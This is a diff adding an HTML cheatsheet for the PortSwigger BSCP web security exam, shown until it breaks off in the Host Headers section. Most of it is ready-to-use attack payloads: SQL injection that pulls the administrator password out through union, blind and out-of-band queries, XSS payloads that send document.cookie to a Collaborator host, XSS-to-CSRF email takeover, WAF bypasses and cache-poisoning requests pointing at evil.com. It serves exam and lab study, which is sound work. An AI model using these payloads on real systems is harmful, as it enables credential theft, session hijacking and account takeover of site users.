@@ -1,0 +1,1876 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BSCP Exam Guide</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --border: #30363d;
+    --text: #e6edf3;
+    --muted: #8b949e;
+    --accent: #58a6ff;
+    --green: #3fb950;
+    --red: #f85149;
+    --yellow: #d29922;
+    --sidebar-width: 260px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    font-size: 14px;
+    line-height: 1.6;
+    display: flex;
+  }
+
+  #sidebar {
+    width: var(--sidebar-width);
+    height: 100vh;
+    background: var(--surface);
+    border-right: 1px solid var(--border);
+    position: fixed;
+    top: 0; left: 0;
+    overflow-y: auto;
+    padding: 16px 0 40px;
+    z-index: 100;
+  }
+
+  #sidebar h2 {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--muted);
+    padding: 8px 16px 4px;
+    margin-top: 12px;
+  }
+
+  #sidebar a {
+    display: block;
+    padding: 5px 16px;
+    color: var(--muted);
+    text-decoration: none;
+    font-size: 13px;
+    border-left: 2px solid transparent;
+    transition: color 0.15s, border-color 0.15s;
+  }
+
+  #sidebar a:hover {
+    color: var(--text);
+    background: rgba(255,255,255,0.04);
+  }
+
+  #sidebar a.active {
+    color: var(--accent);
+    border-left-color: var(--accent);
+    background: rgba(88,166,255,0.06);
+  }
+
+  #sidebar .logo {
+    padding: 12px 16px 8px;
+    font-weight: 700;
+    font-size: 15px;
+    color: var(--text);
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 8px;
+  }
+
+  #main {
+    margin-left: var(--sidebar-width);
+    flex: 1;
+    padding: 40px 48px 80px;
+    max-width: 960px;
+  }
+
+  h1 {
+    font-size: 28px;
+    font-weight: 700;
+    margin-bottom: 8px;
+    color: var(--text);
+  }
+
+  .subtitle {
+    color: var(--muted);
+    margin-bottom: 40px;
+    font-size: 14px;
+  }
+
+  .section {
+    margin-bottom: 56px;
+    scroll-margin-top: 24px;
+  }
+
+  .section > h2 {
+    font-size: 20px;
+    font-weight: 600;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 20px;
+    color: var(--text);
+  }
+
+  .subsections {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .sub {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px;
+  }
+
+  .sub h3 {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 12px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .sub.find h3 { color: #3fb950; }
+  .sub.exploit h3 { color: #f85149; }
+
+  ol, ul {
+    padding-left: 18px;
+    color: var(--text);
+  }
+
+  ol li, ul li { margin-bottom: 4px; }
+
+  .table-wrap { overflow-x: auto; margin: 8px 0; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+  }
+
+  th {
+    background: rgba(255,255,255,0.04);
+    color: var(--muted);
+    font-weight: 600;
+    text-align: left;
+    padding: 6px 10px;
+    border: 1px solid var(--border);
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  td {
+    padding: 6px 10px;
+    border: 1px solid var(--border);
+    vertical-align: top;
+    line-height: 1.5;
+  }
+
+  tr:nth-child(even) td { background: rgba(255,255,255,0.015); }
+
+  code {
+    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
+    font-size: 11.5px;
+    background: rgba(88,166,255,0.08);
+    color: #79c0ff;
+    padding: 1px 5px;
+    border-radius: 4px;
+  }
+
+  pre {
+    background: #0d1117;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 12px;
+    overflow-x: auto;
+    margin: 8px 0;
+    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
+    font-size: 11.5px;
+    line-height: 1.6;
+    color: #e6edf3;
+  }
+
+  pre code { background: none; padding: 0; color: inherit; }
+
+  .polyglot {
+    background: rgba(210, 153, 34, 0.08);
+    border: 1px solid rgba(210, 153, 34, 0.3);
+    border-radius: 6px;
+    padding: 12px;
+    margin: 8px 0;
+    font-family: 'SF Mono', 'Cascadia Code', monospace;
+    font-size: 12px;
+    color: #ffa657;
+    word-break: break-all;
+  }
+
+  p { margin-bottom: 6px; color: var(--text); }
+  strong { font-weight: 600; color: #ffa657; }
+
+  .sub p:last-child { margin-bottom: 0; }
+
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+</style>
+</head>
+<body>
+
+<nav id="sidebar">
+  <div class="logo">🔐 BSCP Guide</div>
+  <h2>Setup</h2>
+  <a href="#recon">Recon</a>
+  <a href="#testing">Testing</a>
+  <a href="#recon-checklist">Recon checklist</a>
+  <h2>Vulnerabilities</h2>
+  <a href="#sqli">1. SQLi</a>
+  <a href="#xss">2. XSS</a>
+  <a href="#cache">3. Web Cache Poison</a>
+  <a href="#host">4. Host Headers</a>
+  <a href="#smuggling">5. HTTP Smuggling</a>
+  <a href="#bruteforce">6. Brute Force</a>
+  <a href="#auth">7. Authentication</a>
+  <a href="#csrf">8. CSRF</a>
+  <a href="#pwreset">9. Password Reset</a>
+  <a href="#jwt">10. JWT</a>
+  <a href="#proto">11. Prototype Pollution</a>
+  <a href="#api">12. API Testing</a>
+  <a href="#access">13. Access Control</a>
+  <a href="#graphql">14. GraphQL</a>
+  <a href="#cors">15. CORS</a>
+  <a href="#xxe">16. XXE</a>
+  <a href="#ssrf">17. SSRF</a>
+  <a href="#ssti">18. SSTI</a>
+  <a href="#proto2">19. SS Proto Pollution</a>
+  <a href="#lfi">20. LFI / Path Traversal</a>
+  <a href="#upload">21. File Upload</a>
+  <a href="#deser">22. Deserialization</a>
+  <a href="#cmdi">23. OS Command Injection</a>
+  <a href="#clickjack">24. Clickjacking</a>
+  <a href="#oauth">25. OAuth</a>
+  <h2>Reference</h2>
+  <a href="#delivery">Exploit server delivery</a>
+</nav>
+
+<main id="main">
+  <h1>BSCP Exam Guide</h1>
+  <p class="subtitle">PortSwigger Web Security — cheatsheet for the exam</p>
+
+  <!-- RECON -->
+  <section class="section" id="recon">
+    <h2>Recon</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>Recon</h3>
+        <ol>
+          <li>Log in (if possible)</li>
+          <li>Scan → Audit and crawl → Fast</li>
+          <li>Intruder with artifact list → look for 200/301/302/403</li>
+          <li>Find <code>&lt;script&gt;</code> tags inside pages</li>
+        </ol>
+      </div>
+      <div class="sub exploit">
+        <h3>Mapping</h3>
+        <ol>
+          <li>All features: email change / avatar / comment / search / file upload</li>
+          <li>Unusual JS files → Repeater</li>
+          <li>Check all cookies after every action (login, role change, checkout): decode in Burp Decoder — JWT (<code>eyJ</code>), serialized object (<code>rO0AB</code>, <code>O:</code>, <code>BAh</code>), base64 blobs → anything non-trivial goes into Repeater</li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <!-- TESTING -->
+  <section class="section" id="testing">
+    <h2>Testing — polyglot</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>Payload</h3>
+        <div class="polyglot">'&quot;;&gt;&lt;img src=x onerror=print()&gt;{{7*7}}${7*7}</div>
+      </div>
+      <div class="sub exploit">
+        <h3>Response interpretation</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Response</th><th>Vulnerability</th></tr>
+            <tr><td>SQL error</td><td>SQLi</td></tr>
+            <tr><td><code>&lt;img&gt;</code> rendered</td><td>XSS</td></tr>
+            <tr><td><code>49</code> in response</td><td>SSTI</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- RECON CHECKLIST -->
+  <section class="section" id="recon-checklist">
+    <h2>Recon checklist</h2>
+    <div class="subsections">
+      <div class="sub find" style="grid-column: 1 / -1">
+        <h3>What to check per vulnerability</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Vulnerability</th><th>Where to look</th><th>Quick check</th></tr>
+            <tr><td>SQLi</td><td>Search, login, filters, sorting, any param in URL/body</td><td>Insert <code>'</code> → SQL error? Boolean diff? Delay?</td></tr>
+            <tr><td>XSS</td><td>All reflected inputs, search, comments, profile fields, URL params</td><td>Polyglot <code>'";>&lt;img src=x onerror=print()&gt;</code> → rendered?</td></tr>
+            <tr><td>Web Cache Poison</td><td>Cached responses (check <code>X-Cache</code>, <code>Age</code> headers)</td><td>Add unknown header → reflected in cached response?</td></tr>
+            <tr><td>Host Header</td><td>Password reset, redirect logic, absolute URL generation</td><td>Change <code>Host:</code> → reflected in response or reset link?</td></tr>
+            <tr><td>HTTP Smuggling</td><td>Proxied requests, load balancers, <code>Transfer-Encoding</code> support</td><td>Send <code>TE: chunked</code> + <code>Content-Length</code> conflict → timing diff?</td></tr>
+            <tr><td>Brute Force</td><td>Login, 2FA, password reset codes</td><td>No rate limit? No lockout? IP-based only (bypassable with <code>X-Forwarded-For</code>)?</td></tr>
+            <tr><td>Authentication</td><td>Login flow, remember-me tokens, 2FA step</td><td>Can skip 2FA by going directly to post-login URL? Username enumeration via timing/error?</td></tr>
+            <tr><td>CSRF</td><td>State-changing forms (email/password/settings change)</td><td>No token? Delete token → works? Separate <code>csrfKey</code> cookie → swap between accounts?</td></tr>
+            <tr><td>Password Reset</td><td>Reset request, reset link, token in URL</td><td>Token predictable? Leaked via <code>Referer</code>? <code>Host:</code> header reflected in link?</td></tr>
+            <tr><td>JWT</td><td><code>Authorization</code> header, cookies with 3-part base64 value</td><td>Decode header — <code>alg</code> field. Try <code>none</code>, try HS256 with public key, check <code>kid</code> param</td></tr>
+            <tr><td>Prototype Pollution</td><td>URL params (<code>?__proto__[x]=1</td><td>Add <code>__proto__[foo]=bar</code> → reflected on object properties?</td></tr>
+            <tr><td>API Testing</td><td>Undocumented endpoints, <code>/api/</code>, version paths (<code>/v1/</code>, <code>/v2/</code>)</td><td>Fuzz endpoints, check OPTIONS, change HTTP method, try <code>PATCH</code>/<code>PUT</code>/<code>DELETE</code></td></tr>
+            <tr><td>Access Control</td><td>Admin paths, user ID params, role-based features</td><td>IDOR: swap <code>userId</code>/<code>id</code> to another user's. Horizontal + vertical escalation</td></tr>
+            <tr><td>GraphQL</td><td><code>/graphql</code>, <code>/api/graphql</code>, any JSON with <code>query:</code></td><td>Send introspection query → schema exposed?</td></tr>
+            <tr><td>CORS</td><td>Responses with <code>Access-Control-Allow-Origin</code></td><td>Send <code>Origin: evil.com</code> → reflected? <code>ACAO: *</code> + credentials?</td></tr>
+            <tr><td>XXE</td><td>XML input, file upload (SVG/DOCX), SOAP endpoints</td><td>Inject <code>&lt;!DOCTYPE&gt;</code> + external entity → response includes file content?</td></tr>
+            <tr><td>SSRF</td><td>URL params, webhooks, <code>?url=</code>, <code>?file=</code>, imports</td><td>Point to <code>http://169.254.169.254/</code> → cloud metadata in response?</td></tr>
+            <tr><td>SSTI</td><td>Template-rendered fields: email subjects, PDFs, profile names</td><td><code>{{7*7}}</code> / <code>${7*7}</code> / <code>&lt;%=7*7%&gt;</code> → <code>49</code> in output?</td></tr>
+            <tr><td>SS Prototype Pollution</td><td>JSON body params with merge/clone on server (Node.js)</td><td><code>{"__proto__":{"status":555}}</code> → 404 returns 555?</td></tr>
+            <tr><td>LFI / Path Traversal</td><td><code>?file=</code>, <code>?img=</code>, <code>filename=</code>, any file reference param</td><td><code>../../../etc/passwd</code> → file content in response?</td></tr>
+            <tr><td>File Upload</td><td>Any upload form</td><td>Upload <code>.php</code> directly → accessible via URL? Check Content-Type validation</td></tr>
+            <tr><td>Deserialization</td><td>Cookies/params with <code>rO0AB</code> (Java) or <code>O:4:</code> (PHP)</td><td>Decode → recognise serialized object → modify + re-encode → different behaviour?</td></tr>
+            <tr><td>OS Command Injection</td><td>Features calling shell: ping, DNS lookup, file conversion</td><td><code>; sleep 5</code> → response delayed? <code>| whoami</code> → output in response?</td></tr>
+            <tr><td>Clickjacking</td><td>Sensitive actions (delete account, transfer, confirm)</td><td>No <code>X-Frame-Options</code> / <code>frame-ancestors</code>? Page loads in iframe?</td></tr>
+            <tr><td>OAuth</td><td>Login with third-party, <code>/oauth/</code> flow, <code>redirect_uri</code> param</td><td><code>redirect_uri</code> not validated → change to evil.com → auth code in URL?</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 1. SQLi -->
+  <section class="section" id="sqli">
+    <h2>1. SQLi</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: search, login, filters, sorting. <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" style="color:var(--accent)">Cheat sheet</a></p>
+        <p>Order: <strong>Error → Boolean → Time → OOB</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Type</th><th>Detection</th></tr>
+            <tr><td>Error-based</td><td>insert <code>'</code> → SQL error in response</td></tr>
+            <tr><td>Boolean blind</td><td><code>' AND 1=1--</code> vs <code>' AND 1=2--</code> → response changes</td></tr>
+            <tr><td>Time blind</td><td><code>' AND SLEEP(5)--</code> / <code>'; SELECT pg_sleep(5)--</code></td></tr>
+            <tr><td>Union-based</td><td><code>' UNION SELECT NULL--</code> → data in response</td></tr>
+            <tr><td>OOB</td><td>no reaction → DNS/HTTP via Burp Collaborator<br><code>' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE r [&lt;!ENTITY % r SYSTEM "http://COLLABORATOR"&gt; %r;]&gt;'),'/l') FROM dual--</code> (Oracle)<br><code>'; exec master..xp_dirtree '//COLLABORATOR/a'--</code> (MSSQL)</td></tr>
+          </table>
+        </div>
+
+        <p style="margin-top:10px"><strong>DB identification — via error:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Error text after inserting <code>'</code>:</p>
+        <pre><code>ORA-                              → Oracle
+syntax error / pg_                → PostgreSQL
+You have an error in your SQL...  → MySQL
+Unclosed quotation mark           → MSSQL</code></pre>
+
+        <p style="margin-top:10px"><strong>DB identification — blind (no errors, only delay):</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Try one by one, watch for ~5s delay:</p>
+        <pre><code>' AND SLEEP(5)--                              → MySQL
+'; SELECT pg_sleep(5)--                       → PostgreSQL
+'; WAITFOR DELAY '0:0:5'--                    → MSSQL
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--    → Oracle
+
+# Oracle doesn't respond to sleep → verify via dual:
+' AND 1=1 AND (SELECT 1 FROM dual)=1--        → no error = Oracle</code></pre>
+
+        <p style="margin-top:10px"><strong>DB identification — concatenation (if no delays work):</strong></p>
+        <pre><code>DATE||(SELECT+'')           → PostgreSQL
+DATE,(SELECT+'')            → MySQL
+DATE||(SELECT+''+FROM+dual) → Oracle
+DATE+(SELECT+'')            → MSSQL</code></pre>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Type</th><th>DB</th><th>Payload</th></tr>
+            <tr><td>Error-based</td><td>MySQL</td><td><code>' AND extractvalue(1,concat(0x7e,(SELECT version())))--</code></td></tr>
+            <tr><td>Error-based</td><td>MSSQL</td><td><code>' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--</code></td></tr>
+            <tr><td>Union-based</td><td>MySQL/PG</td><td><code>' UNION SELECT username,password,NULL FROM users--</code></td></tr>
+            <tr><td>Union-based</td><td>Oracle</td><td><code>' UNION SELECT username,password FROM users--</code></td></tr>
+            <tr><td>Boolean blind</td><td>PG</td><td><code>' AND SUBSTRING((SELECT password FROM users),1,1)='a'--</code></td></tr>
+            <tr><td>Time blind</td><td>MySQL</td><td><code>' AND SLEEP(5)--</code></td></tr>
+            <tr><td>Time blind</td><td>PG</td><td><code>'; SELECT pg_sleep(5)--</code></td></tr>
+            <tr><td>Time blind</td><td>MSSQL</td><td><code>'; WAITFOR DELAY '0:0:5'--</code></td></tr>
+            <tr><td>Time blind</td><td>Oracle</td><td><code>' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--</code></td></tr>
+            <tr><td>OOB exfil</td><td>Oracle</td><td><code>x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;?xml...?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP/"&gt; %remote;]&gt;'),'/l')+FROM+dual--</code></td></tr>
+            <tr><td>Visible error</td><td>PG</td><td><code>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</code></td></tr>
+            <tr><td>Conditional error</td><td>Oracle</td><td><code>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code></td></tr>
+            <tr><td>Auth bypass</td><td>Any</td><td><code>admin'--</code> / <code>' OR 1=1--</code></td></tr>
+            <tr><td>Version</td><td>Oracle</td><td><code>'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</code></td></tr>
+            <tr><td>WAF bypass XML</td><td>Any</td><td><code>&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT username||'~'||password FROM users&lt;/@hex_entities&gt;&lt;/storeId&gt;</code></td></tr>
+          </table>
+        </div>
+
+        <p style="margin-top:12px"><strong>Blind SQLi — step-by-step:</strong></p>
+        <pre><code># Step 1 — confirm injection works
+' AND 1=1--    → response as normal (true)
+' AND 1=2--    → response different / empty (false)
+
+# Step 2 — verify table exists
+' AND (SELECT 'x' FROM users LIMIT 1)='x'--
+→ true = users table exists
+
+# If table name unknown — find via information_schema
+' AND (SELECT SUBSTRING(table_name,1,1)
+  FROM information_schema.tables
+  WHERE table_schema='public' LIMIT 1)='u'--
+→ brute-force char by char until you build the name
+
+# Step 3 — verify user exists
+' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--
+
+# Step 4 — find password length (binary search)
+' AND (SELECT 'x' FROM users WHERE username='administrator'
+  AND LENGTH(password)&gt;10)='x'--
+' AND (SELECT 'x' FROM users WHERE username='administrator'
+  AND LENGTH(password)=20)='x'--
+
+# Step 5 — extract password char by char
+' AND SUBSTRING((SELECT password FROM users
+  WHERE username='administrator'),1,1)='a'--
+→ no match → try next: 'b', 'c'...
+→ found first char → move to position 2 → 3...
+
+# In Intruder: mark §a§, payload: a-z 0-9
+# Grep match: string present in true response (e.g. "Welcome")</code></pre>
+
+        <p style="margin-top:10px"><strong>Blind time-based (no boolean difference):</strong></p>
+        <pre><code>' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a')
+  THEN pg_sleep(5) ELSE pg_sleep(0) END
+  FROM users WHERE username='administrator')--
+→ 5s delay = correct char</code></pre>
+
+        <p style="margin-top:10px"><strong>Blind time-based via TrackingId cookie (PostgreSQL):</strong></p>
+        <pre><code># Verify
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+# Extract password char by char
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+# Intruder: Cluster bomb — position 1 (1..n), position 2 (a-z 0-9)
+# Resource pool → max concurrent requests = 1
+# 10s+ delay = correct char</code></pre>
+
+        <p style="margin-top:10px"><strong>ORDER BY injection (Oracle):</strong></p>
+        <pre><code># Detection
+CASE+WHEN+(1=1)+THEN+date+ELSE+1/0+END → page loads (true)
+CASE+WHEN+(1=2)+THEN+date+ELSE+1/0+END → error (false)
+
+# Visible error → table name (PG)
+CAST((SELECT+table_name+FROM+information_schema.tables
+  WHERE+table_schema='public'+LIMIT+1+OFFSET+0)+AS+integer)
+
+# Extract password
+CAST((SELECT+password+FROM+users
+  WHERE+username='administrator')+AS+integer)
+
+# Boolean char-by-char
+CASE+WHEN+(SELECT+SUBSTR(password,1,1)
+  FROM+users+WHERE+username='administrator')='a'
+  +THEN+date+ELSE+1/0+END</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- 2. XSS -->
+  <section class="section" id="xss">
+    <h2>2. XSS</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: any input reflected on the page.</p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Type</th><th>Description</th></tr>
+            <tr><td>Reflected</td><td>input is reflected in the response</td></tr>
+            <tr><td>Stored</td><td>input saved in DB, shown to other users</td></tr>
+            <tr><td>DOM</td><td>source: <code>location.search</code>, <code>postMessage</code>, <code>document.referrer</code></td></tr>
+          </table>
+        </div>
+        <p style="margin-top:8px">Check reflection context: HTML / attribute / JS / URL sink.</p>
+        <p>DOM: DevTools → Sources → find sink (<code>innerHTML</code>, <code>eval</code>, <code>document.write</code>).</p>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Sink / context</th><th>Payload</th></tr>
+            <tr><td>HTML (<code>innerHTML</code>, <code>document.write</code>)</td><td><code>&lt;img src=x onerror=print()&gt;</code></td></tr>
+            <tr><td>Attribute</td><td><code>" onmouseover="print()</code></td></tr>
+            <tr><td>JS context (<code>&lt;script&gt;</code>)</td><td><code>';print()//</code></td></tr>
+            <tr><td>JS — escape bypass</td><td><code>\';print()//</code></td></tr>
+            <tr><td>JS template literal</td><td><code>${alert(1)}</code></td></tr>
+            <tr><td>URL sink (<code>href</code>, <code>location</code>)</td><td><code>javascript:print()</code></td></tr>
+            <tr><td>Reflected DOM <code>eval()</code></td><td><code>\"-alert(1)}//</code></td></tr>
+            <tr><td>searchTerm in JSON → <code>eval()</code></td><td><code>"};alert(1)//</code></td></tr>
+            <tr><td>Stored DOM <code>replace()</code></td><td><code>&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;</code> — <code>replace('&lt;','&amp;lt;')</code> encodes only the first <code>&lt;</code>, the rest pass through</td></tr>
+            <tr><td>postMessage sink</td><td><code>&lt;iframe src=URL onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}"," * ")'&gt;</code></td></tr>
+          </table>
+        </div>
+        <p style="margin-top:8px"><strong>DOM XSS via web message source:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Site has an <code>addEventListener('message', ...)</code> that takes the message data and inserts it into the DOM via <code>innerHTML</code> / <code>document.write</code> without validation. Any origin can send a message — exploit via iframe on exploit server.</p>
+        <p style="font-size:12px;color:var(--muted)"><strong>How to find:</strong> in DevTools → Sources search for <code>addEventListener.*message</code> → check what it does with <code>event.data</code>. If it goes into <code>innerHTML</code>, <code>document.write</code>, <code>eval</code> or a URL sink — exploitable.</p>
+        <pre><code>&lt;!-- Basic: trigger print() --&gt;
+&lt;iframe src="https://TARGET/" onload="this.contentWindow.postMessage('&lt;img src=1 onerror=print()&gt;','*')"&gt;&lt;/iframe&gt;
+
+&lt;!-- Steal cookies --&gt;
+&lt;iframe src="https://TARGET/" onload="this.contentWindow.postMessage('&lt;img src=1 onerror=fetch(`https://COLLABORATOR/?c=`+document.cookie)&gt;','*')"&gt;&lt;/iframe&gt;</code></pre>
+        <p style="margin-top:8px"><strong>WAF bypass:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>Payload</th></tr>
+            <tr><td>onresize + iframe</td><td><code>&lt;body onresize=print()&gt;</code></td></tr>
+            <tr><td>Custom tag</td><td><code>&lt;xss id=x onfocus=alert(1) tabindex=1&gt;</code> → <code>#x</code></td></tr>
+            <tr><td>SVG</td><td><code>&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</code></td></tr>
+            <tr><td>Canonical (Chrome)</td><td><code>&lt;link rel=canonical href='...?x=accesskey='x'onclick='alert(1)'&gt;</code></td></tr>
+            <tr><td>Parentheses blocked</td><td><code>&lt;img src=1 onerror=eval;throw"=alert\x281\x29"&gt;</code> — <code>onerror</code> = <code>eval</code>, <code>throw</code> passes string as argument</td></tr>
+          </table>
+        </div>
+        <p style="margin-top:8px"><strong>WAF — enumerate allowed tags/events (Intruder):</strong></p>
+        <ol style="margin-top:4px;padding-left:20px;font-size:13px">
+          <li>Find allowed tags: search param = <code>&lt;§§&gt;</code> → Intruder → Payloads: paste tags from XSS cheat sheet → run → filter by status 200. Typically only <code>&lt;body&gt;</code> passes.</li>
+          <li>Find allowed events: search param = <code>&lt;body%20§§=1&gt;</code> → same approach with event handlers → filter 200. Typically only <code>onresize</code> passes.</li>
+          <li>Deliver via exploit server (iframe triggers resize automatically):</li>
+        </ol>
+        <pre><code>&lt;iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody+onresize=print()%3E"
+        onload="this.style.width='100px'"&gt;&lt;/iframe&gt;
+&lt;!-- URL-decoded search value: "&gt;&lt;body onresize=print()&gt; --&gt;</code></pre>
+        <p style="margin-top:8px"><strong>Advanced exploitation:</strong></p>
+        <pre><code>// Show cookies via alert (quick check)
+alert(document.cookie)
+
+// Cookie steal (exfil to server)
+fetch('https://COLLABORATOR/?c='+document.cookie,{mode:'no-cors'})
+
+// XSS→CSRF (change email)
+fetch('/email/change-email',{method:'POST',mode:'no-cors',
+  body:'email=attacker@evil.com&_csrf='+
+  document.querySelector('[name=_csrf]').value})</code></pre>
+        <p><strong>Delivery via exploit server:</strong></p>
+        <pre><code>&lt;script&gt;window.location='https://LAB/?search="};alert(1)//';&lt;/script&gt;
+&lt;!-- or iframe to avoid navigation --&gt;
+&lt;iframe src='https://LAB/?search="};alert(1)//'&gt;&lt;/iframe&gt;</code></pre>
+        <p style="margin-top:10px"><strong>CSTI — AngularJS (ng-app):</strong></p>
+        <p style="font-size:12px;color:var(--muted)">If the page has <code>ng-app</code> / <code>data-ng-app</code> — AngularJS processes <code>{{ }}</code> client-side. Input reflected inside <code>ng-app</code> element is evaluated as a template even if HTML-escaped by the server.</p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Check</th><th>Payload</th></tr>
+            <tr><td>Detect</td><td><code>{{7*7}}</code> → <code>49</code> in output = CSTI</td></tr>
+            <tr><td>XSS (any version)</td><td><code>{{constructor.constructor('alert(1)')()}}</code></td></tr>
+            <tr><td>XSS (v1.3-1.5 sandbox bypass)</td><td><code>{{$on.constructor('alert(1)')()}}</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 3. Web Cache Poison -->
+  <section class="section" id="cache">
+    <h2>3. Web Cache Poison</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: headers/parameters that affect the response but are not part of the cache key.</p>
+        <ol style="margin-top:8px">
+          <li>Add <code>?cb=&lt;random&gt;</code> — cache buster</li>
+          <li>Add non-standard headers → check if reflected in links/redirects</li>
+          <li><strong>Param Miner</strong> (Burp) → find unkeyed params and headers</li>
+        </ol>
+        <div class="table-wrap" style="margin-top:10px">
+          <table>
+            <tr><th>Header</th><th>What to look for in response</th></tr>
+            <tr><td><code>X-Forwarded-Host</code></td><td>host in links / redirects</td></tr>
+            <tr><td><code>X-Host</code></td><td>alternative to X-Forwarded-Host</td></tr>
+            <tr><td><code>X-Forwarded-Scheme</code></td><td>scheme (http/https) in redirect</td></tr>
+            <tr><td><code>X-Original-URL</code></td><td>access control bypass</td></tr>
+          </table>
+        </div>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <p><strong>Combo:</strong> one header doesn't work → try both together:</p>
+        <pre><code>X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: http
+→ 302 Location: https://evil.com/</code></pre>
+        <p><strong>Unkeyed cookie → XSS:</strong></p>
+        <pre><code>Cookie: fehost=bad"&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+        <p><strong>Vary: User-Agent:</strong> get victim's UA via <code>&lt;img src="https://exploit-server/x"&gt;</code> → poison cache with that UA.</p>
+        <p><strong>Unkeyed query string</strong> — <code>?cb=x</code> doesn't work as buster → use header as cache buster:</p>
+        <pre><code>Origin: https://cachebuster.evil.com</code></pre>
+        <p><strong>Cache parameter cloaking:</strong></p>
+        <pre><code>GET /?utm_content=x?callback=evil_payload
+GET /?param=innocent;callback=evil  (Rails: ; = separator)</code></pre>
+        <p><strong>Fat GET — body param overrides URL param:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Cache keys the URL only; backend processes both URL and body. Duplicate the target param in the body — backend uses the body value, cache stores it under the original URL key.</p>
+        <pre><code>GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
+Host: TARGET
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+callback=alert(1)//</code></pre>
+        <p style="font-size:12px;color:var(--muted)">Cache key = <code>?callback=setCountryCookie</code> (URL). Backend returns <code>alert(1)//(…)</code>. Next victim hitting the same URL gets poisoned JS.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 4. Host Headers -->
+  <section class="section" id="host">
+    <h2>4. Host Headers</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: <code>Host</code> header used in links, emails, redirects.</p>
+        <ol style="margin-top:8px">
+          <li>Replace with <code>Host: localhost</code> → check access to <code>/admin</code></li>
+          <li>Replace with <code>Host: evil.com</code> → check if reflected in password reset email link</li>
